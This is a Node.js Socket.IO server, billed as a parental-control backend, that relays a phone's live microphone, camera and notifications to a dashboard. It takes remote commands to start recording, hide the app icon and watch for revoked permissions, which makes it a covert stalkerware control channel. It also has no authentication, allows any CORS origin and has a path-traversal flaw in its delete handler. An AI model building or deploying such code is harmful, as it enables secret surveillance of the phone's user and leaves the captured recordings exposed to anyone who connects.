require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');

// Ensure uploads directory exists
const uploadsDir = path.join(__dirname, 'public', 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

const app = express();
const server = http.createServer(app);

// CORS Configuration
const allowedOrigins = process.env.ALLOWED_ORIGINS
  ? process.env.ALLOWED_ORIGINS.split(',').map(origin => origin.trim())
  : ['*'];

const io = new Server(server, {
  cors: {
    origin: allowedOrigins.includes('*') ? '*' : allowedOrigins,
    methods: ["GET", "POST"],
    credentials: true
  }
});

// Middleware
app.use(compression());
app.use(helmet({
  contentSecurityPolicy: false, // Disable CSP for easier Socket.IO integration
  crossOriginEmbedderPolicy: false
}));
app.use(cors({
  origin: allowedOrigins.includes('*') ? '*' : allowedOrigins,
  credentials: true
}));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Health check endpoint for Render
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    version: '1.0.0'
  });
});

// API info endpoint
app.get('/api/info', (req, res) => {
  res.json({
    name: 'Parental Control Backend',
    version: '1.0.0',
    socketIO: true,
    endpoints: {
      health: '/health',
      root: '/',
      recordings: '/uploads'
    }
  });
});

io.on('connection', (socket) => {
  console.log('New Client Connected');

  // Emit to web client for visibility
  io.emit('log', 'New Client Connected: ' + socket.id);

  socket.on('disconnect', () => {
    console.log('Client Disconnected');
    io.emit('log', 'Client Disconnected: ' + socket.id);
  });

  // Handle Audio Stream
  socket.on('audio_stream', (data) => {
    // Broadcast to web clients
    io.emit('audio_data', data);
  });

  // Handle Video Stream
  socket.on('video_frame', (data) => {
    io.emit('video_data', data);
  });

  // Handle Status Updates
  socket.on('status_update', (status) => {
    io.emit('server_log', 'App Status: ' + status); // Relay as log
  });

  // Commands from web dashboard
  socket.on('get_status', () => {
    socket.broadcast.emit('GET_STATUS');
  });

  socket.on('start_monitoring', () => {
    socket.broadcast.emit('START_AUDIO');
  });

  socket.on('stop_monitoring', () => {
    socket.broadcast.emit('STOP_AUDIO');
  });

  socket.on('start_video', () => {
    socket.broadcast.emit('START_CAM');
  });

  socket.on('stop_video', () => {
    socket.broadcast.emit('STOP_CAM');
  });

  socket.on('switch_camera', () => {
    socket.broadcast.emit('SWITCH_CAM');
  });

  socket.on('toggle_flash', () => {
    socket.broadcast.emit('TOGGLE_FLASH');
  });

  socket.on('brightness_up', () => {
    socket.broadcast.emit('BRIGHTNESS_UP');
  });

  socket.on('brightness_down', () => {
    socket.broadcast.emit('BRIGHTNESS_DOWN');
  });

  // Remote config management
  socket.on('update_config', (config) => {
    console.log('[Server] Config update:', config);
    socket.broadcast.emit('UPDATE_CONFIG', config);
  });

  socket.on('get_config', () => {
    socket.broadcast.emit('GET_CONFIG');
  });

  socket.on('get_storage_stats', () => {
    socket.broadcast.emit('GET_STORAGE_STATS');
  });

  socket.on('current_config', (config) => {
    socket.broadcast.emit('current_config', config);
  });

  socket.on('storage_stats', (stats) => {
    socket.broadcast.emit('storage_stats', stats);
  });

  // Handle Offline Audio File Uploads
  socket.on('upload_audio_file', (filename, data) => {
    // payload: { filename: "audio_123.pcm", data: Buffer }
    console.log(`[Server] Receiving file: ${filename}`);
    try {
      const timestamp = new Date().getTime();
      const safeName = (filename || `audio_${timestamp}`).replace(/[^a-z0-9._-]/gi, '_');
      const pcmData = data; // Raw buffer

      if (!pcmData) {
        console.error("[Server] No data received for file");
        return;
      }

      // Convert PCM to WAV
      const wavHeader = createWavHeader(pcmData.length);
      const wavBuffer = Buffer.concat([wavHeader, pcmData]);

      // Save as .wav
      const wavName = safeName.replace('.pcm', '') + '.wav';
      const filePath = path.join(uploadsDir, wavName);

      fs.writeFile(filePath, wavBuffer, (err) => {
        if (err) {
          console.error("Error saving file:", err);
        } else {
          console.log(`[Server] Saved recording: ${wavName}`);
          // Notify dashboard to refresh list if open
          io.emit('new_recording', { name: wavName, size: wavBuffer.length, date: new Date().toISOString() });
        }
      });
    } catch (e) {
      console.error("Error handling upload:", e);
    }
  });

  socket.on('get_recordings_list', () => {
    fs.readdir(uploadsDir, (err, files) => {
      if (err) return;
      const recordings = files
        .filter(f => f.endsWith('.wav'))
        .map(f => {
          const stats = fs.statSync(path.join(uploadsDir, f));
          return {
            name: f,
            size: stats.size,
            date: stats.mtime.toISOString()
          };
        })
        .sort((a, b) => new Date(b.date) - new Date(a.date)); // Newest first

      socket.emit('recordings_list', recordings);
    });
  });

  socket.on('delete_recording', (filename) => {
    const filePath = path.join(uploadsDir, filename);
    if (fs.existsSync(filePath)) {
      fs.unlink(filePath, (err) => {
        if (!err) {
          io.emit('recording_deleted', filename);
        }
      });
    }
  });



  // App icon control
  socket.on('hide_app_icon', () => {
    console.log('[Server] Hide app icon requested');
    socket.broadcast.emit('HIDE_APP_ICON');
  });

  socket.on('show_app_icon', () => {
    console.log('[Server] Show app icon requested');
    socket.broadcast.emit('SHOW_APP_ICON');
  });

  // Permission alerts
  socket.on('permission_revoked', (permissionName) => {
    console.log(`[Server] Permission revoked: ${permissionName}`);
    socket.broadcast.emit('permission_alert', permissionName);
  });

  // Notification monitoring
  socket.on('notification_posted', (notification) => {
    console.log(`[Server] Notification: ${JSON.parse(notification).title}`);
    socket.broadcast.emit('live_notification', notification);
  });

  socket.on('offline_notifications', (notifications) => {
    console.log(`[Server] Received offline notifications`);
    socket.broadcast.emit('offline_notifications_received', notifications);
  });

  // ============= WebRTC Signaling Pass-Through =============
  socket.on('webrtc_offer', (offer) => {
    console.log('[Server] WebRTC offer received, broadcasting...');
    socket.broadcast.emit('webrtc_offer', offer);
  });

  socket.on('webrtc_answer', (answer) => {
    console.log('[Server] WebRTC answer received, broadcasting...');
    socket.broadcast.emit('webrtc_answer', answer);
  });

  socket.on('webrtc_ice_candidate', (candidate) => {
    console.log('[Server] WebRTC ICE candidate received, broadcasting...');
    socket.broadcast.emit('webrtc_ice_candidate', candidate);
  });
});

const PORT = process.env.PORT || 3000;
const NODE_ENV = process.env.NODE_ENV || 'development';

server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📂 Environment: ${NODE_ENV}`);
  console.log(`📁 Uploads directory: ${uploadsDir}`);
  console.log(`🌐 CORS origins: ${allowedOrigins.join(', ')}`);
});

// Error handling
server.on('error', (error) => {
  if (error.code === 'EADDRINUSE') {
    console.error(`❌ Port ${PORT} is already in use`);
    process.exit(1);
  } else {
    console.error('❌ Server error:', error);
    process.exit(1);
  }
});

// Graceful shutdown
const gracefulShutdown = (signal) => {
  console.log(`\n${signal} received. Closing server gracefully...`);

  server.close(() => {
    console.log('✅ HTTP server closed');

    io.close(() => {
      console.log('✅ Socket.IO server closed');
      process.exit(0);
    });
  });

  // Force close after 10 seconds
  setTimeout(() => {
    console.error('⚠️ Forced shutdown after timeout');
    process.exit(1);
  }, 10000);
};

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

function createWavHeader(dataLength) {
  const buffer = Buffer.alloc(44);

  // RIFF chunk descriptor
  buffer.write('RIFF', 0);
  buffer.writeUInt32LE(36 + dataLength, 4);
  buffer.write('WAVE', 8);

  // fmt sub-chunk
  buffer.write('fmt ', 12);
  buffer.writeUInt32LE(16, 16); // Subchunk1Size (16 for PCM)
  buffer.writeUInt16LE(1, 20);  // AudioFormat (1 for PCM)
  buffer.writeUInt16LE(1, 22);  // NumChannels (1 for Mono)
  buffer.writeUInt32LE(44100, 24); // SampleRate
  buffer.writeUInt32LE(44100 * 2, 28); // ByteRate (SampleRate * BlockAlign)
  buffer.writeUInt16LE(2, 32);  // BlockAlign (NumChannels * BitsPerSample/8)
  buffer.writeUInt16LE(16, 34); // BitsPerSample

  // data sub-chunk
  buffer.write('data', 36);
  buffer.writeUInt32LE(dataLength, 40);

  return buffer;
}
